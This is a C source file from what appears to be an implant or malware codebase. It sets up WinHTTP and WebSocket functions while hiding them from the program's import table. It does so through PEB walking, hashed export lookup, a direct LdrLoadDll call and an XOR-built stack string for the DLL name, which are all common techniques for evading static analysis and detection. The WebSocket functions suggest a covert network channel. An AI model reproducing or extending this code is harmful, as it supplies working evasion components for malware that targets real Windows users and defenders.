/* winhttp_api.c - the constructor behind winhttp_api.h.
 *
 * Bootstrap: with every WinHTTP call resolved at runtime, the exe no
 * longer imports winhttp.dll - so the loader never maps it and there
 * is nothing in the PEB list to walk. The Ctor asks the loader itself:
 * ntdll.dll is mapped in every process (it IS the loader), its
 * LdrLoadDll export maps winhttp.dll for us, and only then does the
 * table resolve. One ResolveFromModuleByName per member afterwards -
 * exactly the kernel32.c / ntdll.c pattern of this codebase.
 */

#include "winhttp_api.h"
#include "system.h"
#include "peb.h"
#include "ntdll.h"
#include "djb2.h"
#include "apihash.h"
#include "stackstrings.h"

/* Make sure winhttp.dll is mapped; return its base (NULL on failure). */
static PVOID map_winhttp(void)
{
    /* Already loaded? (Some other component may have pulled it in.) */
    PVOID base = GetModuleHandleFromPEB(HASH_MOD_WINHTTP);
    if (base != NULL)
        return base;

    /* Resolve LdrLoadDll from ntdll - the module itself must come from
     * the PEB walk; its name cannot be hashed before it is found. */
    NTDLL ntdll;
    if (!NTDLL_Ctor(&ntdll) || ntdll.LdrLoadDll == NULL)
        return NULL;

    /* The loader needs REAL bytes for the name (a hash cannot be passed
     * to LdrLoadDll), so this one string is built on the stack -
     * single-pass XOR writes, no .rdata literal (stackstrings.h). */
    WCHAR nameBuf[12];
    StrWinhttp(nameBuf);

    UNICODE_STRING name;
    name.Length        = STRLEN_BYTES_WINHTTP;      /* 11 chars * 2 */
    name.MaximumLength = STRLEN_BYTES_WINHTTP + 2;  /* + NUL         */
    name.Buffer        = nameBuf;

    PVOID loaded = NULL;
    if (ntdll.LdrLoadDll(NULL, 0, &name, &loaded) != 0 || loaded == NULL)
        return NULL;

    return loaded;
}

BOOL WINHTTP_API_Ctor(WINHTTP_API *api)
{
    if (api == NULL)
        return FALSE;

    PVOID winhttp = map_winhttp();
    if (winhttp == NULL)
        return FALSE;

    api->WinHttpCrackUrl = (BOOL (WINAPI *)(const WCHAR *, DWORD, DWORD,
                                            URL_COMPONENTS *))
        ResolveExportByHash(winhttp, HASH_WINHTTPCRACKURL);
    api->WinHttpWebSocketSend = (DWORD (WINAPI *)(HINTERNET,
                                                  WINHTTP_WEB_SOCKET_BUFFER_TYPE,
                                                  PVOID, DWORD))
        ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETSEND);
    api->WinHttpWebSocketReceive = (DWORD (WINAPI *)(HINTERNET, PVOID, DWORD,
                                                     DWORD *,
                                                     WINHTTP_WEB_SOCKET_BUFFER_TYPE *))
        ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETRECEIVE);
    api->WinHttpOpen = (HINTERNET (WINAPI *)(const WCHAR *, DWORD, const WCHAR *,
                                             const WCHAR *, DWORD))
        ResolveExportByHash(winhttp, HASH_WINHTTPOPEN);
    api->WinHttpConnect = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *, UINT16,
                                                DWORD))
        ResolveExportByHash(winhttp, HASH_WINHTTPCONNECT);
    api->WinHttpOpenRequest = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *,
                                                    const WCHAR *, const WCHAR *, const WCHAR *,
                                                    const WCHAR **, DWORD))
        ResolveExportByHash(winhttp, HASH_WINHTTPOPENREQUEST);
    api->WinHttpSetOption = (BOOL (WINAPI *)(HINTERNET, DWORD, PVOID, DWORD))
        ResolveExportByHash(winhttp, HASH_WINHTTPSETOPTION);
    api->WinHttpSendRequest = (BOOL (WINAPI *)(HINTERNET, const WCHAR *, DWORD,
                                               PVOID, DWORD, DWORD,
                                               ULONG_PTR))
        ResolveExportByHash(winhttp, HASH_WINHTTPSENDREQUEST);
    api->WinHttpReceiveResponse = (BOOL (WINAPI *)(HINTERNET, PVOID))
        ResolveExportByHash(winhttp, HASH_WINHTTPRECEIVERESPONSE);
    api->WinHttpWebSocketCompleteUpgrade = (HINTERNET (WINAPI *)(HINTERNET,
                                                                 ULONG_PTR))
        ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETCOMPLETEUPGRADE);
    api->WinHttpCloseHandle = (BOOL (WINAPI *)(HINTERNET))
        ResolveExportByHash(winhttp, HASH_WINHTTPCLOSEHANDLE);

    return (api->WinHttpCrackUrl != NULL &&
            api->WinHttpWebSocketSend != NULL &&
            api->WinHttpWebSocketReceive != NULL &&
            api->WinHttpOpen != NULL &&
            api->WinHttpConnect != NULL &&
            api->WinHttpOpenRequest != NULL &&
            api->WinHttpSetOption != NULL &&
            api->WinHttpSendRequest != NULL &&
            api->WinHttpReceiveResponse != NULL &&
            api->WinHttpWebSocketCompleteUpgrade != NULL &&
            api->WinHttpCloseHandle != NULL);
}
